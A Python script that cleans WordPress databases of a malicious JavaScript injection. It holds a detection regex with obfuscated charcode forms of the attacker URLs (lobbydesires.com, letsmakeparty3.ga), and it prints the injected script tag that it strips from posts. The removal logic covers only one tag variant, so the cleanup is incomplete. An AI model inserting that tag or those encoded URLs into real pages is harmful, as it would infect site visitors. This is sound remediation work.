#!/usr/bin/python3
# requirements:
# python -m pip install mysql-connector-python

import re, sys, mysql.connector
from mysql.connector import Error

regex = """(lobbydesires\.com)|(String\.fromCharCode\(104,116,116,112,115,58,47,47,108,111,98,98,121,100,101,115,105,114,101,115,46,99,111,109,47,108,111,99,97,116,105,111,110,46,106,115,63,115,61,49\))|(107,46,100,101,118,101,108,111)|(108,111,98,98,121,100,101,115,105,114,101,115)|(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116)|(function makemee)|(chr\(104\)\.chr\(116\)\.chr\(116\)\.chr\(112\)\.chr\(115\)\.chr\(58\)\.chr\(47\)\.chr\(47\)\.chr\(108\)\.chr\(101\)\.chr\(116\)\.chr\(115\)\.chr\(109\)\.chr\(97\)\.chr\(107\)\.chr\(101\)\.chr\(112\)\.chr\(97\)\.chr\(114\)\.chr\(116\))|(letsmakeparty3.ga)|(104,116,116,112,115,58,47,47,108,101,116,115,109,97,107,101,112,97,114,116,121,51,46,103,97,47,108,46,106,115,63,100,61,49)"""

DB_HOST = 'localhost'
DB_NAME = ''
DB_USER = ''
DB_PASSWORD = ''

if (DB_NAME == '' or DB_HOST == '' or DB_USER == '' or DB_PASSWORD == ''):
    print("\n /!\ NO DATABASE CREDS \n Open this script file and please provide the WordPress database credentials\n You can find them in the wp-config.php file\n")
    exit(0)

print("/!\ Be safe & make a backup before !")
k = input("Write 'yes' to continue: ")
if k != "yes":
    print("Ok bye !")
    exit(0)

CLEANED_POSTS = 0
try:
    # Connect to MySQL DB
    conn = mysql.connector.connect(host = DB_HOST,
                                   user = DB_USER,
                                   password = DB_PASSWORD,
                                   database = DB_NAME)
    cur = conn.cursor()
    # Search POSTS table as the virus 
    cur.execute("SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE `TABLE_NAME` LIKE '%post%'")
    rows = cur.fetchall()
    for row in rows:
        TABLE_SCHEMA = row[0]
        TABLE_NAME = row[1]

        # Check the presence of the infected column
        cur.execute("SHOW COLUMNS FROM "+TABLE_SCHEMA+"."+TABLE_NAME+" LIKE 'post_content'");
        if (cur.fetchall() != []):

            # Select all posts content
            cur.execute("SELECT post_content FROM "+TABLE_SCHEMA+"."+TABLE_NAME)
            posts = cur.fetchall()
            for post in posts:
                # Delete the payload if infected
                if bool(re.search(regex, post[0], flags = re.M)):
                    cur.execute("UPDATE "+TABLE_SCHEMA+"."+TABLE_NAME+" set post_content = REPLACE(post_content,\"<script src='https://letsmakeparty3.ga/l.js?qs=1' type='text/javascript'></script>\",\"\") WHERE post_content LIKE '%letsmakeparty3%'")
                    CLEANED_POSTS += 1

except Error as e:
    print("MySQL Error : ",e)
    sys.exit(1)

finally:
    if (conn.is_connected()):
        cur.close()
        conn.close()

print("")
print( "> {} cleaned articles".format(CLEANED_POSTS))

